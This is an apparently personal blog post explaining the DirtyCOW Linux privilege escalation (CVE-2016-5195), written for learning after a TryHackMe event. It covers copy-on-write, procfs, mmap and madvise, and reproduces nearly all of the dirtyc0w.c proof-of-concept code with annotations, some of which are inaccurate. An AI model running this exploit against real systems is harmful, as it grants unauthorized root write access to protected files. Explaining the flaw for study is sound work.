---
layout: post
title:  "DirtyCOW privilege escalation"
date: 2020-12-27 19:01:52 -0500
categories: security
---
## Why this?
Having no security experience (and this blog should not be interpreted in any way to be that I know what I'm talking about), I decided this year to participate in TryHackMe's [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2). One of the challenges referenced the DirtyCOW privilege escalation (CVE-2016-5195), something I had only heard in passing without having any in-depth knowledge. I figured I should broaden my horizons a bit to do some research, understand why proof of concepts work, be able to explain it and demo it and write something up about it.. even if it is from 2016

## Background
CVE-2016-5195 is a privilege escalation vulnerability in the Linux Kernel, which takes advantage of a race condition found where the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings

This effectively can allow an unprivileged user to increase their privileges on the system

### Race condition
A race condition is when a system that handles tasks in a specific sequence is forced to perform two or more operations simultaneously

### proc filesystem (procfs)
procfs presents information about processes and other system information in a hierarchical file-like structure. This makes it more convenient to access process data in the kernel rather than having to use tracing methods. This kind of acts as a communication between kernel and user space in memory

Linux separates its directories as `/proc/PID` (`PID` is the process number). One of the directories of interest is `/proc/self`, which is a symbolic link to the `PID` of the current process. For example, if you were to run `ls -la /proc/self` multiple times, the symbolic link changes to another `PID`

```
stephen@ubuntu:/home/stephen$ ls -la /proc/self
lrwxrwxrwx 1 root root 0 Dec 27 12:04 /proc/self -> 84
stephen@ubuntu:/home/stephen$ ls -la /proc/self
lrwxrwxrwx 1 root root 0 Dec 27 12:04 /proc/self -> 85
stephen@ubuntu:/home/stephen$ ls -la /proc/self
lrwxrwxrwx 1 root root 0 Dec 27 12:04 /proc/self -> 86
stephen@ubuntu:/home/stephen$ ls -la /proc/self
lrwxrwxrwx 1 root root 0 Dec 27 12:04 /proc/self -> 87
stephen@ubuntu:/home/stephen$
```

## Important Linux system calls
These calls are used in the proof of concepts

### mmap
```c
#include <sys/mman.h>
void *mmap(void *addr, size_t length, int prot, int flags,
           int fd, off_t offset);
int munmap(void *addr, size_t length);
```
`mmap()` creates a new mapping in the virtual address space of the calling process

### madvise
```c
#include <sys/mman.h>
int madvise(void *addr, size_t length, int advice);
```
`madvise()` gives advice or directions to the kernal about the address range. This begins at the address `addr` and ends with the `length` offset. This is generally to improve system or application performance

The `advice` value that used in the proof of concept is `MADV_DONTNEED`. This means "Do not expect access in the near future"

This is used because we have two steps in the proof of concept, given a root_file

1. Locate the physical address of the root_file
2. Write to that address

`madvise()` is inserted between those two steps with the `MADV_DONTNEED` advice value, which says we don't need the private mapping anymore

## dirtyc0w proof of concept
This section reviews the proof of concept at https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c. Understanding this proof of concept helps to further explain the other proofs on concept at https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs, or at least I hope so. This should also be pretty fun as I have little to no c experience

### High-level
When compiled, dirtyc0w.c takes two arguments:
1. protected file
2. contents to write to the protected file

The program opens the file in read only mode. It then creates a new, private copy-on-write mapping in the virtual address space, that has the same size as our protected file

Two threads are then created:
1. `madvise()` will set the mapping that we created earlier to tell the system that the private mapping isn't needed anymore
2. `procselfmem` opens the `/proc/self/mem` file in read/write mode, resets the file pointer back to the start of the file and starts writing contents to the protected file at the beginning of the file

### c code
I won't bother copying/pasting the entire thing here, but just talk about the different sections
```c
void *madviseThread(void *arg)
{
  char *str;                            
  str=(char*)arg;                       
  int i,c=0;                            // Initialize for-loop variables
  for(i=0;i<100000000;i++)              // 
  {                                     // For-loop over 100000000 bytes
    c+=madvise(map,100,MADV_DONTNEED);  // in 100 byte increments
  }                                     // in the new mapping to set
  printf("madvise %d\n\n",c);           // madvise that the private
}                                       // mapping isn't needed
```

```c
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;

  int f=open("/proc/self/mem",O_RDWR);  // Open /prov/self/mem/
  int i,c=0;                            // in read/write
  for(i=0;i<100000000;i++) {            // For-loop over 100000000 bytes
    
    lseek(f,(uintptr_t) map,SEEK_SET);  // Reset the file pointer to the
                                        // file start position in memory
    c+=write(f,str,strlen(str));        // Write arg to the file
  }
  printf("procselfmem %d\n\n", c);
}
```

```c
int main(int argc,char *argv[])
{
  // Checking for arguments
  if (argc<3) {
  (void)fprintf(stderr, "%s\n",
      "usage: dirtyc0w target_file new_content");
  return 1; }
  pthread_t pth1,pth2;

  // Open the protected file in read-only mode
  f=open(argv[1],O_RDONLY);
  // Populate the st struct (of type stat) with the file information
  fstat(f,&st);
  name=argv[1];

  // Creates a private mapping, which causes the copy-on-write mapping
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);

  // Sets up the first thread madvise()
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  // Sets up the second thread to write to /proc/self/mem
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);

  // Wait for the threads to finish
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
```

## See also
* https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
* https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/index.html
* https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/demo.html
* https://www.secpod.com/blog/dirty-cow-vulnerability/
* https://www.veracode.com/security/race-condition
* https://en.wikipedia.org/wiki/Procfs
* https://www.man7.org/linux/man-pages/man2/mmap.2.html
* https://man7.org/linux/man-pages/man2/madvise.2.html
